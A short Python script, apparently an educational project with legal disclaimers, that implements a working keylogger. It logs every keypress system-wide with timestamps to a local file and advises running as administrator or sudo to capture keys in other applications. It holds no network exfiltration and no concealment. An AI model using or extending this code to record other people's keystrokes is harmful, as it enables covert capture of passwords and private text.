# WARNING: This project is for educational purposes only. Do not use to monitor devices without explicit permission. Always respect laws.
import keyboard
import datetime
import os

LOG_FILE = "log.txt"

def keylogger():
    print("Keylogger Started. Run as administrator to capture keys in other apps. Press 'Esc' to stop.")
    
    try:
        while True:
            evento = keyboard.read_event(suppress=False)
            if evento.event_type == keyboard.KEY_DOWN:
                tecla = evento.name

                if tecla == 'esc':
                    print("Keylogger Stopped")
                    break

                if tecla == 'space':
                    tecla = " [SPACE] "
                elif tecla == 'enter':
                    tecla = " [ENTER] "
                elif tecla == 'backspace':
                    tecla = " [BACKSPACE] "

                salvar_log(tecla)

    except Exception as e:
        print(f"Keylogger ERROR: {e}")
        salvar_log(f"[ERROR] {e}")

def salvar_log(tecla):
    try:
        with open(LOG_FILE, "a") as arquivo:
            arquivo.write(f"{datetime.datetime.now()}: {tecla}\n")
    except Exception as e:
        print(f"Error saving log: {e}")

if __name__ == "__main__":
    confirmacao = input("Do you want to start the Keylogger? (y/n): ").lower()

    if confirmacao == "y":
        if os.name == "nt":  # Windows
            print("WARNING: Run as administrator to capture keys in other applications.")
        elif os.name == "posix":  # Linux/Mac
            print("WARNING: You may need to run with 'sudo' on Linux systems.")
        keylogger()
    else:
        print("Canceled execution.")

# END: Reminder: Use this code only for learning in controlled environments. Respect laws.
